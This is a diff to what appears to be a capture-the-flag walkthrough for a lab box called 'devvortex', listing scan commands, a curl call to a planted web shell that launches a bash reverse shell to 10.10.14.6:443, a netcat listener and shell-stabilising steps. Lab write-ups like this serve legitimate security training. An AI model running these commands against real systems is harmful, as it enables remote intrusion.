@@ -6,11 +6,20 @@ nmap -p 22,80 -sCV 10.10.11.242
 
 ffuf -u http://10.10.11.242 -H 'Host: FUZZ.devvortex.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
 
+```
+## [Feroxbuster](HTTP)
+```
 feroxbuster -u http://devvortex.htb -x html
+```
 
+```
 curl http://dev.devvortex.htb/plugins/search/webshell/evil.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
 
 nc -lvnp 443
+
+```
+
+```
 
 script /dev/null -c bash
 stty raw -echo ; fg
